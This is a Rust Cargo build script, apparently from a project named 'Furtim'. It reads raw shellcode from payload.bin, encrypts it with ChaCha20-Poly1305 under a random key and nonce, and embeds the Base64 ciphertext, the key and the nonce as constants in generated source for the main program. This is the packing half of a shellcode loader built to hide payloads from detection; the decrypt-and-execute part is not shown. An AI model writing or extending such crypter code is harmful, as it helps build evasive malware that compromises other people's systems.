use chacha20poly1305::{
    aead::{Aead, KeyInit}, // Characteristics for Authenticated Encryption with Associated Data (AEAD)
    ChaCha20Poly1305, Key, Nonce, // The specific cipher struct and types for Key/Nonce
};
use rand::RngCore; // Characteristics that defines methods for generating random data (like fill_bytes)
use rand::rngs::OsRng; // The OS-specific Cryptographically Secure Pseudo-Random Number Generator (CSPRNG)
use std::env; // To access environment variables (specifically OUT_DIR)
use std::fs; // For file system operations (reading/writing files)
use std::io::Write; // Characteristics for writing data to streams/files
use std::path::Path; // For handling file paths in a cross-platform way

// BASE64 ENGINE IMPORTS
use base64::engine::Engine as _; // Import the Engine Characteristics to use encoding methods
use base64::engine::general_purpose::STANDARD; // The standard Base64 alphabet engine


fn main() {
    // Send out a warning to the Cargo output to indicate the build script has started
    println!("cargo:warning=--- Furtim BUILD.RS STARTED ---"); 
    
    // 1. Define the path to the raw shellcode file
    let payload_path = Path::new("payload.bin"); // Ensure this file exists in the project root
    
    // Instruct Cargo to re-run this build script only if "payload.bin" changes
    println!("cargo:rerun-if-changed={}", payload_path.display()); // Optimization to avoid unnecessary rebuilds

    // 2. Read the raw shellcode bytes into memory
    let shellcode = fs::read(payload_path)
        .expect("Error: payload.bin not found or could not be read. Ensure it exists in the project root.");
        
    println!("cargo:warning=Shellcode read successfully, size: {} bytes", shellcode.len()); 
    
    // 3. Generate a random Encryption Key and Nonce
    // We instantiate the OS Random Number Generator
    let mut rng = OsRng::default();

    // Generate a random 32-byte (256-bit) Key
    let mut key_bytes = [0u8; 32];
    RngCore::fill_bytes(&mut rng, &mut key_bytes); // Fill the key_bytes array with random data because ChaCha20-Poly1305 requires a 256-bit key
    let key = Key::from_slice(&key_bytes); // Convert the byte array into a Key type for the cipher

    // Generate a random 12-byte (96-bit) Nonce (Number used ONCE)
    let mut nonce_bytes = [0u8; 12];
    RngCore::fill_bytes(&mut rng, &mut nonce_bytes); 
    let nonce = Nonce::from_slice(&nonce_bytes);

    // 4. Initialize the ChaCha20-Poly1305 cipher and encrypt the payload
    // This provides both confidentiality (encryption) and integrity (Poly1305 MAC)
    let cipher = ChaCha20Poly1305::new(key); // Define the cipher with the generated key
    let ciphertext_vec = cipher // Define the ciphertext vector by encrypting the shellcode
        .encrypt(nonce, shellcode.as_ref())
        .expect("Payload encryption failed!");

    // 5. Encode the encrypted binary data into a Base64 string
    // This ensures the binary data can be safely stored as a string literal in the source code
    let ciphertext_base64 = STANDARD.encode(ciphertext_vec); 
    
    // 6. Generate the Rust source file containing the constants
    // Retrieve the build output directory path managed by Cargo
    let out_dir = env::var("OUT_DIR").unwrap();
    let dest_path = Path::new(&out_dir).join("payload_data.rs"); 

    let mut file = fs::File::create(&dest_path).expect("Could not create payload_data.rs file");
    
    // Write the constants (Base64 ciphertext, Key, and Nonce) to the file
    // These will be included by main.rs at compile time
    writeln!(
        file,
        "pub const ENCRYPTED_PAYLOAD_BASE64: &str = \"{}\";",  // Write the Base64 encoded ciphertext to the file
        ciphertext_base64
    ).unwrap(); // Unwrap to handle any potential write errors
    writeln!(file, "pub const PAYLOAD_KEY: [u8; 32] = {:?};", key_bytes).unwrap();
    writeln!(file, "pub const PAYLOAD_NONCE: [u8; 12] = {:?};", nonce_bytes).unwrap();
    
    // Notify completion
    println!("cargo:warning=--- Furtim: Shellcode successfully encrypted in {}", dest_path.display());
    println!("cargo:warning=--- Furtim BUILD.RS FINISHED ---");
}